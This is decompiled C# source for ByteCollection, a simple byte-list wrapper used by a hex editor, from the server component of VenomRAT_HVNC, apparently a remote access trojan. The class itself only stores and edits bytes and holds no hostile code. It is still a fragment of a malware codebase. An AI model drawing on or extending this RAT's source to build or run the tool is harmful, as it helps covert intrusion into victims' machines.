using System;
using System.Collections.Generic;

namespace VenomRAT_HVNC.Server.Helper.HexEditor
{
    // Token: 0x02000068 RID: 104
    public class ByteCollection
    {
        // Token: 0x170000A1 RID: 161
        // (get) Token: 0x06000361 RID: 865 RVA: 0x0001FC24 File Offset: 0x0001FC24
        public int Length
        {
            get
            {
                return this._bytes.Count;
            }
        }

        // Token: 0x06000362 RID: 866 RVA: 0x0001FC31 File Offset: 0x0001FC31
        public ByteCollection()
        {
            this._bytes = new List<byte>();
        }

        // Token: 0x06000363 RID: 867 RVA: 0x0001FC44 File Offset: 0x0001FC44
        public ByteCollection(byte[] bytes)
        {
            this._bytes = new List<byte>(bytes);
        }

        // Token: 0x06000364 RID: 868 RVA: 0x0001FC58 File Offset: 0x0001FC58
        public void Add(byte item)
        {
            this._bytes.Add(item);
        }

        // Token: 0x06000365 RID: 869 RVA: 0x0001FC66 File Offset: 0x0001FC66
        public void Insert(int index, byte item)
        {
            this._bytes.Insert(index, item);
        }

        // Token: 0x06000366 RID: 870 RVA: 0x0001FC75 File Offset: 0x0001FC75
        public void Remove(byte item)
        {
            this._bytes.Remove(item);
        }

        // Token: 0x06000367 RID: 871 RVA: 0x0001FC84 File Offset: 0x0001FC84
        public void RemoveAt(int index)
        {
            this._bytes.RemoveAt(index);
        }

        // Token: 0x06000368 RID: 872 RVA: 0x0001FC92 File Offset: 0x0001FC92
        public void RemoveRange(int startIndex, int count)
        {
            this._bytes.RemoveRange(startIndex, count);
        }

        // Token: 0x06000369 RID: 873 RVA: 0x0001FCA1 File Offset: 0x0001FCA1
        public byte GetAt(int index)
        {
            return this._bytes[index];
        }

        // Token: 0x0600036A RID: 874 RVA: 0x0001FCAF File Offset: 0x0001FCAF
        public void SetAt(int index, byte item)
        {
            this._bytes[index] = item;
        }

        // Token: 0x0600036B RID: 875 RVA: 0x0001FCBE File Offset: 0x0001FCBE
        public char GetCharAt(int index)
        {
            return Convert.ToChar(this._bytes[index]);
        }

        // Token: 0x0600036C RID: 876 RVA: 0x0001FCD1 File Offset: 0x0001FCD1
        public byte[] ToArray()
        {
            return this._bytes.ToArray();
        }

        // Token: 0x040002B7 RID: 695
        private List<byte> _bytes;
    }
}